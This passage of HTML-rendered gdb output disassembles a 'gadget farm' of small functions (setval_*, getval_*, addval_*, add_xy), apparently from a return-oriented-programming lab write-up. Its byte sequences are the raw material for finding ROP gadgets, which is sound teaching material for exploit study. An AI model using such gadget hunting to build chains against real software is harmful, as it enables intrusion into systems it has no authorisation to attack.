style=--0:#E1E4E8>    </span><span style=--0:#79B8FF>-0x6fa78caf(%rdi</span><span style=--0:#E1E4E8>),%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>10</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019ad</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_219+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>11</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019ae</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_237+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>07</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>48</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>movl</span><span style=--0:#E1E4E8>   $0xc7c78948</span><span style=--0:#9ECBFF>,</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>%rdi</span><span style=--0:#E1E4E8>)</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>12</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019b4</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_237+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>13</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019b5</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_424+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>07</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>54</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c2</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>58</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>92</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>movl</span><span style=--0:#E1E4E8>   $0x9258c254</span><span style=--0:#9ECBFF>,</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>%rdi</span><span style=--0:#E1E4E8>)</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>14</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019bb</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_424+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>15</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019bc</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_470+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>07</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>63</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>48</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>8d</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>movl</span><span style=--0:#E1E4E8>   $0xc78d4863</span><span style=--0:#9ECBFF>,</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>%rdi</span><span style=--0:#E1E4E8>)</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>16</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019c2</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_470+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>17</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019c3</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_426+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>07</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>48</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>90</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>movl</span><span style=--0:#E1E4E8>   $0x90c78948</span><span style=--0:#9ECBFF>,</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>%rdi</span><span style=--0:#E1E4E8>)</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>18</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019c9</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_426+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>19</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019ca</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_280+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>b8</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>29</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>58</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>90</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>          </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0xc3905829</span><span style=--0:#9ECBFF>,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>20</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019cf</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_280+5>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>21</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019d0</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;mid_farm+0>:</span><span style=--0:#E1E4E8>     </span><span style=--0:#9ECBFF>b8</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>01</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8>          </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x1</span><span style=--0:#9ECBFF>,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>22</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019d5</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;mid_farm+5>:</span><span style=--0:#E1E4E8>     </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>23</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019d6</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;add_xy+0>:</span><span style=--0:#E1E4E8>       </span><span style=--0:#79B8FF>48</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>8d</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>04</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>37</span><span style=--0:#E1E4E8>             </span><span style=--0:#9ECBFF>lea</span><span style=--0:#E1E4E8>    (%rdi,%rsi,1),%rax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>24</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019da</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;add_xy+4>:</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>25</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019db</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_481+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>b8</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>5c</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c2</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>90</span><span style=--0:#E1E4E8>          </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x90c2895c</span><span style=--0:#9ECBFF>,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>26</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019e0</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_481+5>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>27</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019e1</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_296+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>07</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>99</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>d1</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>90</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>90</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>movl</span><span style=--0:#E1E4E8>   $0x9090d199</span><span style=--0:#9ECBFF>,</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>%rdi</span><span style=--0:#E1E4E8>)</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>28</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019e7</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_296+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>29</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019e8</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_113+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>8d</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>87</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>ce</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>78</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c9</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>lea</span><span style=--0:#E1E4E8>    </span><span style=--0:#79B8FF>-0x36873177(%rdi</span><span style=--0:#E1E4E8>),%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>30</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019ee</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_113+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>31</div></div><div class=code><span style=--0:#B392F0>--Type</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;RET></span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>for</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>more,</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>q</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>to</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>quit,</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>to</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>continue</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>without</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>paging--c</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>32</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019ef</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_490+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>8d</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>87</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>8d</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>d1</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>20</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>db</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>lea</span><span style=--0:#E1E4E8>    </span><span style=--0:#79B8FF>-0x24df2e73(%rdi</span><span style=--0:#E1E4E8>),%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>33</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019f5</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_490+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>34</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019f6</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_226+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>b8</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>d1</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>48</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c0</span><span style=--0:#E1E4E8>          </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0xc048d189</span><span style=--0:#9ECBFF>,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>35</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019fb</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_226+5>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>36</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019fc</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_384+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>07</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>81</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>d1</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>84</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c0</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>movl</span><span style=--0:#E1E4E8>   $0xc084d181</span><span style=--0:#9ECBFF>,</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>%rdi</span><span style=--0:#E1E4E8>)</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>37</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a02</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_384+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>38</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a03</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_190+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>8d</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>87</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>41</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>48</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>e0</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>lea</span><span style=--0:#E1E4E8>    </span><span style=--0:#79B8FF>-0x1f76b7bf(%rdi</span><span style=--0:#E1E4E8>),%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>39</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a09</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_190+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>40</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a0a</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_276+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>07</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>88</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c2</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>08</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c9</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>movl</span><span style=--0:#E1E4E8>   $0xc908c288</span><span style=--0:#9ECBFF>,</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>%rdi</span><span style=--0:#E1E4E8>)</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>41</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a10</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_276+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>42</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a11</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_436+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>8d</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>87</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>ce</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>90</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>90</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>lea</span><span style=--0:#E1E4E8>    </span><span style=--0:#79B8FF>-0x6f6f3177(%rdi</span><span style=--0:#E1E4E8>),%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>43</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a17</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_436+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>44</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a18</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_345+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>b8</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>48</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>e0</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c1</span><span style=--0:#E1E4E8>          </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0xc1e08948</span><span style=--0:#9ECBFF>,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>45</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a1d</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_345+5>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>46</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a1e</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_479+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>8d</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>87</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c2</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c9</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>lea</span><span style=--0:#E1E4E8>    </span><span style=--0:#79B8FF>-0x36ff3d77(%rdi</span><span style=--0:#E1E4E8>),%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>47</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a24</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_479+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>48</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a25</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_187+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>8d</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>87</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>ce</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>38</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c0</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>lea</span><span style=--0:#E1E4E8>    </span><span style=--0:#79B8FF>-0x3fc73177(%rdi</span><span style=--0:#E1E4E8>),%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>49</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a2b</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_187+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>50</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a2c</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_248+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>07</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>81</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>ce</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>08</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>db</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>movl</span><span style=--0:#E1E4E8>   $0xdb08ce81</span><span style=--0:#9ECBFF>,</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>%rdi</span><span style=--0:#E1E4E8>)</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>51</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a32</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_248+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>52</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a33</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_159+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>b8</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>d1</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>38</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c9</span><span style=--0:#E1E4E8>          </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0xc938d189</span><span style=--0:#9ECBFF>,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>53</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a38</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_159+5>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>54</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a39</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_110+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>8d</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>87</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c8</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>e0</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>lea</span><span style=--0:#E1E4E8>    </span><span style=--0:#79B8FF>-0x3c1f7638(%rdi</span><span style=--0:#E1E4E8>),%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>55</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a3f</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_110+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>56</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a40</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_487+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>8d</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>87</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c2</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>84</span><span style=--0:#E1E4E8> </span><span 